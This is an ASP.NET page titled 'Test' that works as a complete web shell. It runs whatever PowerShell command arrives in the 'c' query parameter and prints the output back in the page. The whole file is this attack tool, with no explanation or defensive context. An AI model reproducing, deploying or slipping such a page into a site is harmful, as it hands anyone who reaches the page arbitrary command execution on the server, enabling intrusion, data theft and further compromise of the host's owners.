<%@ Page Language="C#" Debug="true" Trace="false" EnableViewState="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
  ProcessStartInfo aaaa = new ProcessStartInfo();
  aaaa.FileName = "powershell.exe";
  aaaa.Arguments = "-c " + Request.QueryString["c"];
  aaaa.RedirectStandardOutput = true;
  aaaa.RedirectStandardError = true;
  aaaa.UseShellExecute = false;
  Process bbbb = Process.Start(aaaa);
  cccc.Text = bbbb.StandardOutput.ReadToEnd() + bbbb.StandardError.ReadToEnd();
%>
<html>
  <head>
    <title>Test</title>
  </head>
  <body>
    <pre><asp:Literal runat="server" ID="cccc" Mode="Encode"/></pre>
  </body>
</html>
